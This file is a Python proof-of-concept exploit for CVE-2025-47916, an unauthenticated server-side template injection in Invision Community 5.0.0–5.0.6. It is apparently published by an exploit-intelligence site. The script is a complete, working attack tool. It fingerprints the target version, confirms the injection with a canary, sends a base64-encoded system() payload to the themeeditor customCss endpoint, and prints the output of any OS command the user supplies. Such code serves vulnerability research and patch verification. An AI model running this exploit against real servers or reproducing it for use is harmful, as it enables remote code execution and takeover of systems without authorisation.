#!/usr/bin/env python3
"""
CVE-2025-47916 — Invision Community <= 5.0.6 Unauthenticated RCE via SSTI
Exploit Intelligence Platform | https://exploit-intel.com | @exploit_intel

Demonstrates Server-Side Template Injection (SSTI) leading to Remote Code Execution
in Invision Community 5.0.0 through 5.0.6. The customCss() method of the themeeditor
controller accepts unauthenticated POST requests and passes user-supplied content to
Theme::makeProcessFunction(), which compiles {expression="..."} template tags into PHP
code and evaluates them via eval().

Attack Vector: OS command execution via system() through {expression="..."} template tag.

Usage:
    python3 poc.py <target_host> [port]
    python3 poc.py <target_host> [port] --command "whoami"
    python3 poc.py <target_host> [port] --check-only
"""

import sys
import base64
import urllib.request
import urllib.parse
import urllib.error
import re
import argparse


# Marker string used to delimit command output in the HTTP response.
# The template injection payload uses die('MARKER'.system(cmd)) so that:
# - system() output appears first (PHP's system() echoes to stdout)
# - Then the marker appears as part of the die() output
# We extract everything before the marker to get the command output.
OUTPUT_MARKER = "________"


def version_check(target_host, target_port):
    """
    Step 1: Check if the target is running a vulnerable version of Invision Community.

    IPS ships a version file at /admin/install/eula.txt that contains
    the version string (e.g., " IPS 5.0.6"). We parse this to determine
    if the target is in the vulnerable range (5.0.0 - 5.0.6).
    """
    url = f"http://{target_host}:{target_port}/admin/install/eula.txt"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")

        # Parse version from EULA — format: " IPS X.Y.Z"
        match = re.search(r"IPS\s+(\d+\.\d+\.\d+)", body)
        if match:
            version = match.group(1)
            parts = list(map(int, version.split(".")))
            # Vulnerable: 5.0.0 through 5.0.6
            if parts[0] == 5 and parts[1] == 0 and 0 <= parts[2] <= 6:
                return version, True
            else:
                return version, False
        return None, None
    except Exception as e:
        print(f"[!] Version check failed: {e}")
        return None, None


def build_payload(command):
    """
    Step 2: Build the SSTI payload for OS command execution.

    The IPS template engine compiles {expression="EXPR"} into:
        <?php echo EXPR; ?>
    and evaluates it via eval().

    We use:
        {expression="die('________'.system(base64_decode('CMD_B64')))"}

    This results in eval('echo die("________".system(base64_decode("CMD_B64")));')

    - base64 encoding avoids issues with special characters in URL encoding
    - die() halts further page rendering and outputs the result cleanly
    - system() executes the OS command and echoes output to stdout
    - The marker string delimits the command output for extraction
    """
    cmd_b64 = base64.b64encode(command.encode()).decode()
    payload = '{expression="die(\'' + OUTPUT_MARKER + '\'.system(base64_decode(\'' + cmd_b64 + '\')))"}'
    return payload


def send_exploit(target_host, target_port, payload):
    """
    Step 3: Send the exploit POST request to the vulnerable endpoint.

    The vulnerable endpoint is:
        POST /index.php?app=core&module=system&controller=themeeditor&do=customCss

    with the 'content' parameter containing the SSTI payload.

    IPS's router dispatches this to themeeditor::customCss() which has NO
    authentication check in versions 5.0.0-5.0.6. The content parameter
    is passed directly to Theme::makeProcessFunction() for template compilation.
    """
    url = f"http://{target_host}:{target_port}/index.php"

    # POST parameters that route to the vulnerable controller method
    params = {
        "app": "core",
        "module": "system",
        "controller": "themeeditor",
        "do": "customCss",
        "content": payload,
    }

    data = urllib.parse.urlencode(params).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )

    try:
        resp = urllib.request.urlopen(req, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return None, None
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None, None


def extract_output(response_body):
    """
    Step 4: Extract the command output from the HTTP response.

    The response body contains:
        <command output><marker><command output again>

    system() in PHP echoes output to stdout (which Apache captures) AND returns it.
    die() then outputs marker + returned value. So the pattern is:
        stdout_output + marker + returned_output

    We split on the marker and take everything before it.
    """
    if OUTPUT_MARKER in response_body:
        output = response_body.split(OUTPUT_MARKER)[0]
        return output.strip()
    return None


def check_vulnerable(target_host, target_port):
    """
    Minimal vulnerability check using a non-destructive payload.

    Uses {expression="die('VULN_CONFIRM')"} — a simple PHP die() that outputs
    a known string. If the response contains our string, the template injection
    is confirmed without executing any OS commands.
    """
    canary = "CVE_2025_47916_CONFIRMED"
    payload = '{expression="die(\'' + canary + '\')"}'

    status, body = send_exploit(target_host, target_port, payload)
    if body and canary in body:
        return True
    return False


def exploit(target_host, target_port, command="id", check_only=False):
    """Run the full exploit chain against the target."""

    print(f"[*] CVE-2025-47916: Invision Community <= 5.0.6 Unauthenticated RCE")
    print(f"[*] Target: http://{target_host}:{target_port}/")
    print()

    # ── Step 1: Version fingerprinting ──────────────────────────────────
    print("[*] Step 1: Checking target version...")
    version, is_vuln = version_check(target_host, target_port)
    if version:
        status = "VULNERABLE" if is_vuln else "NOT VULNERABLE"
        print(f"[+] Detected version: IPS {version} ({status})")
        if not is_vuln:
            print("[-] Target version is not in the vulnerable range (5.0.0 - 5.0.6)")
            print("[-] Aborting.")
            return False
    else:
        print("[!] Could not determine version (eula.txt not found or unparseable)")
        print("[*] Proceeding with exploit attempt anyway...")
    print()

    # ── Step 2: Vulnerability confirmation ──────────────────────────────
    print("[*] Step 2: Confirming template injection (non-destructive check)...")
    if check_vulnerable(target_host, target_port):
        print("[+] Template injection CONFIRMED — target is exploitable!")
    else:
        print("[-] Template injection check failed — target may not be vulnerable")
        print("[-] Aborting.")
        return False
    print()

    if check_only:
        print("[+] Vulnerability confirmed. Exiting (--check-only mode).")
        return True

    # ── Step 3: Execute OS command ──────────────────────────────────────
    print(f"[*] Step 3: Executing command: {command}")
    payload = build_payload(command)
    status, body = send_exploit(target_host, target_port, payload)

    if status is None:
        print("[-] Failed to connect to target")
        return False

    if status == 403:
        print(f"[-] HTTP 403 — target is patched (access denied)")
        return False

    output = extract_output(body)
    if output is not None:
        print(f"[+] Command executed successfully!")
        print(f"[+] HTTP Status: {status}")
        print()
        print("─── Command Output ───")
        print(output)
        print("──────────────────────")
        print()
        print("[+] EXPLOITATION SUCCESSFUL — Remote Code Execution confirmed")
        return True
    else:
        print(f"[-] Exploit failed — marker string not found in response")
        print(f"[-] HTTP Status: {status}")
        if body:
            print(f"[-] Response body (first 500 chars): {body[:500]}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-47916: Invision Community <= 5.0.6 Unauthenticated RCE PoC"
    )
    parser.add_argument("target", help="Target host (IP or hostname)")
    parser.add_argument("port", nargs="?", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-c", "--command", default="id", help="OS command to execute (default: id)")
    parser.add_argument("--check-only", action="store_true", help="Only check vulnerability, don't execute commands")

    args = parser.parse_args()

    success = exploit(args.target, args.port, args.command, args.check_only)
    sys.exit(0 if success else 1)
